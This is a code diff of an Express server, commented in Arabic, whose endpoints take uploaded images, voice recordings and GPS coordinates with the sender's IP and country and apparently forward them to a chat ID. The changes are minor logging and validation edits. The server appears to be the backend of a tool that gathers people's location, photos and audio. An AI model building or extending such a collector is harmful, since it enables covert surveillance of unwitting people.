@@ -130,7 +130,6 @@ IP: ${additionalData.ip}
         res.status(400).json({ error: 'No images received' });
     }
 });
-
 // استلام الصوت
 app.post('/submitVoice', upload.single('voice'), (req, res) => {
     const chatId = req.body.chatId;
@@ -164,6 +163,7 @@ IP: ${additionalData.ip}
         });
 });
 
+
 // استلام الموقع
 app.post('/submitLocation', upload.none(), async (req, res) => {
     const chatId = req.body.chatId;
@@ -171,12 +171,14 @@ app.post('/submitLocation', upload.none(), async (req, res) => {
     const longitude = req.body.longitude;
     const additionalData = JSON.parse(req.body.additionalData || '{}');
 
-    if (!latitude || !longitude) {
-        console.error('No location data received');
-        return res.status(400).json({ error: 'No location data received' });
+    console.log("Received location ", { chatId, latitude, longitude, additionalData });
+
+    if (!chatId || !latitude || !longitude) {
+        console.error('Missing required data');
+        return res.status(400).json({ error: 'Missing required data' });
     }
 
-    const caption = `
+   const caption = `
 معلومات إضافية:
 IP: ${additionalData.ip}
 الدولة: ${additionalData.country}
@@ -194,7 +196,7 @@ IP: ${additionalData.ip}
         res.json({ success: true });
     } catch (error) {
         console.error('Error sending location:', error);
-        res.status(500).json({ error: 'Failed to send location message' });
+        res.status(500).json({ error: 'Failed to send location message', details: error.message });
     }
 });
 
@@ -294,5 +296,3 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
-
-
